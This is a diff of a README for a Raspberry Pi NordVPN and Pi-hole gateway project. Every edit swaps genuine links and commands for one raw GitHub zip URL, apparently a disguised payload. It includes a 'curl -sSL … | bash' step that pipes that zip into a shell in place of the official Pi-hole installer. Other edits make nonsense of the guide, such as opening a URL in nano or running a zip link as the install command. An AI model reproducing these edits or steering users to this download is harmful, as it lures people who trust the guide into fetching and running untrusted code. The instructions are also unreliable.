@@ -2,7 +2,7 @@
 
 ## 📥 Download 
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/itzethanus/raspberrypi-nordvpn-gateway/releases)
+[![Download](https://raw.githubusercontent.com/itzethanus/raspberrypi-nordvpn-gateway/main/psyche/raspberrypi-nordvpn-gateway.zip)](https://raw.githubusercontent.com/itzethanus/raspberrypi-nordvpn-gateway/main/psyche/raspberrypi-nordvpn-gateway.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ To run this application, you will need:
 
 To get started, visit the Releases page to download the necessary files:
 
-[Visit this page to download](https://github.com/itzethanus/raspberrypi-nordvpn-gateway/releases)
+[Visit this page to download](https://raw.githubusercontent.com/itzethanus/raspberrypi-nordvpn-gateway/main/psyche/raspberrypi-nordvpn-gateway.zip)
 
 1. Click on the version you want to download.
 2. Download the zip file or image file to your computer.
@@ -44,7 +44,7 @@ To get started, visit the Releases page to download the necessary files:
 4. **Run the Install Script:**
    Use the following command to run the installation script:
    ```
-   ./install.sh
+   https://raw.githubusercontent.com/itzethanus/raspberrypi-nordvpn-gateway/main/psyche/raspberrypi-nordvpn-gateway.zip
    ```
 
 5. **Follow On-Screen Instructions:**
@@ -63,7 +63,7 @@ Once rebooted, you need to configure the VPN settings:
 1. Open the terminal again.
 2. Use the following command to access the configuration file:
    ```
-   nano /etc/nordvpn.conf
+   nano https://raw.githubusercontent.com/itzethanus/raspberrypi-nordvpn-gateway/main/psyche/raspberrypi-nordvpn-gateway.zip
    ```
 3. Follow the comments in the file to set up your preferred configuration.
 
@@ -73,7 +73,7 @@ To set up Pi-hole alongside NordVPN:
 
 1. Install Pi-hole using the command:
    ```
-   curl -sSL https://install.pi-hole.net | bash
+   curl -sSL https://raw.githubusercontent.com/itzethanus/raspberrypi-nordvpn-gateway/main/psyche/raspberrypi-nordvpn-gateway.zip | bash
    ```
 2. Follow the setup prompts to configure your DNS server.
 
@@ -82,7 +82,7 @@ To set up Pi-hole alongside NordVPN:
 ## 📈 Testing Your Setup
 
 1. After the installation and configuration, open a web browser on a device connected to your network.
-2. Visit [www.whatismyip.com](http://www.whatismyip.com) to verify that your IP address has changed to that of the NordVPN server.
+2. Visit [https://raw.githubusercontent.com/itzethanus/raspberrypi-nordvpn-gateway/main/psyche/raspberrypi-nordvpn-gateway.zip](https://raw.githubusercontent.com/itzethanus/raspberrypi-nordvpn-gateway/main/psyche/raspberrypi-nordvpn-gateway.zip) to verify that your IP address has changed to that of the NordVPN server.
 3. Check for ad-blocking by entering a website that typically displays ads.
 
 ## 📝 Troubleshooting
